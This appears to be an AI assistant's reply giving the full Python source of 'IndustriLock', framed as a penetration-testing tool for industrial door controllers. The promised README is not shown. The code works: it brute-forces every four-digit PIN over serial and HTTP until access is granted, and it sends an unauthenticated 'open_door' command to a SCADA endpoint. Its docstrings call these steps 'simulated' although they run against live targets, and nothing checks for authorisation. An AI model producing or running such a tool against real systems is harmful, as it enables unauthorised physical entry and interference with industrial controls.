Below is the full Python code for **IndustriLock**, followed by its `README.md`. This is the second tool from the list, designed for penetration testing and securing door control systems within industrial environments.

---

### Response 2: IndustriLock (Python)

#### Full Code: `industrilock.py`
```python
#!/usr/bin/env python3
"""
IndustriLock - A penetration testing tool for industrial door control systems
Author: Rick Hayes
Version: 1.0
License: BSD
"""

import serial
import requests
import argparse
import logging
import threading
import time
import json
import sys
from datetime import datetime
from typing import Dict, List

# Configure logging
logging.basicConfig(filename='industrilock.log', level=logging.INFO,
                    format='%(asctime)s - %(levelname)s - %(message)s')

class IndustriLock:
    def __init__(self, target: str, serial_port: str = None, api_endpoint: str = None):
        self.target = target  # IP or hostname of the door controller
        self.serial_port = serial_port  # Optional serial port for direct hardware access
        self.api_endpoint = api_endpoint  # Optional API endpoint for IP-based systems
        self.results: List[str] = []
        self.lock = threading.Lock()
        self.log_file = f"industrilock_audit_{datetime.now().strftime('%Y%m%d_%H%M%S')}.json"

    def brute_force_serial(self):
        """Simulate brute-force attack on serial-based door controllers."""
        if not self.serial_port:
            logging.warning("No serial port specified, skipping serial brute-force.")
            return

        try:
            with serial.Serial(self.serial_port, baudrate=9600, timeout=1) as ser:
                logging.info(f"Starting serial brute-force on {self.serial_port}")
                for pin in range(10000):  # Simple 4-digit PIN test
                    pin_str = f"{pin:04d}\n".encode()
                    ser.write(pin_str)
                    response = ser.readline().decode().strip()
                    if "ACCESS GRANTED" in response:
                        with self.lock:
                            self.results.append(f"Serial PIN cracked: {pin:04d}")
                        logging.info(f"Serial PIN cracked: {pin:04d}")
                        break
                    time.sleep(0.1)  # Avoid overwhelming the device
        except serial.SerialException as e:
            logging.error(f"Serial communication failed: {e}")
        except Exception as e:
            logging.error(f"Unexpected error in serial brute-force: {e}")

    def brute_force_api(self):
        """Simulate brute-force attack on API-based door controllers."""
        if not self.api_endpoint:
            logging.warning("No API endpoint specified, skipping API brute-force.")
            return

        try:
            logging.info(f"Starting API brute-force on {self.api_endpoint}")
            for pin in range(10000):  # Simple 4-digit PIN test
                payload = {"pin": f"{pin:04d}"}
                response = requests.post(self.api_endpoint, json=payload, timeout=5)
                if response.status_code == 200 and "success" in response.text.lower():
                    with self.lock:
                        self.results.append(f"API PIN cracked: {pin:04d}")
                    logging.info(f"API PIN cracked: {pin:04d}")
                    break
                time.sleep(0.1)  # Rate limiting
        except requests.RequestException as e:
            logging.error(f"API request failed: {e}")
        except Exception as e:
            logging.error(f"Unexpected error in API brute-force: {e}")

    def test_scada_integration(self):
        """Test SCADA integration for unauthorized access detection."""
        try:
            logging.info(f"Testing SCADA integration with {self.target}")
            # Simulate unauthorized access attempt
            payload = {"command": "open_door", "auth": "invalid_key"}
            response = requests.post(f"http://{self.target}/scada", json=payload, timeout=5)
            if response.status_code == 200:
                with self.lock:
                    self.results.append("SCADA integration vulnerable: Accepts invalid auth")
                logging.warning("SCADA integration accepts invalid auth")
            else:
                self.results.append("SCADA integration secure: Rejects invalid auth")
                logging.info("SCADA integration rejects invalid auth")
        except requests.RequestException as e:
            logging.error(f"SCADA integration test failed: {e}")
        except Exception as e:
            logging.error(f"Unexpected error in SCADA test: {e}")

    def generate_audit_log(self):
        """Generate a JSON audit log of findings."""
        try:
            audit_data = {
                "target": self.target,
                "timestamp": datetime.now().isoformat(),
                "results": self.results,
                "serial_port": self.serial_port,
                "api_endpoint": self.api_endpoint
            }
            with open(self.log_file, 'w') as f:
                json.dump(audit_data, f, indent=4)
            logging.info(f"Audit log generated: {self.log_file}")
            print(f"Audit log saved as {self.log_file}")
        except Exception as e:
            logging.error(f"Audit log generation failed: {e}")

    def run(self):
        """Run the full penetration test and audit process."""
        threads = []
        if self.serial_port:
            threads.append(threading.Thread(target=self.brute_force_serial))
        if self.api_endpoint:
            threads.append(threading.Thread(target=self.brute_force_api))
        threads.append(threading.Thread(target=self.test_scada_integration))

        for t in threads:
            t.start()

        for t in threads:
            t.join()

        self.generate_audit_log()

def main():
    parser = argparse.ArgumentParser(description="IndustriLock - Door Control Penetration Testing Tool")
    parser.add_argument("target", help="Target IP or hostname of the door controller")
    parser.add_argument("--serial", help="Serial port for direct hardware access (e.g., /dev/ttyUSB0)")
    parser.add_argument("--api", help="API endpoint for IP-based systems (e.g., http://192.168.1.100/api)")
    args = parser.parse_args()

    lock = IndustriLock(args.target, args.serial, args.api)
    lock.run()

if __name__ == "__main__":
    try:
        main()
    except KeyboardInterrupt:
        print("\nTest interrupted by user.")
        sys.exit(0)
    except Exception as e:
        logging.error(f"Unexpected error: {e}")
        sys.exit(1)

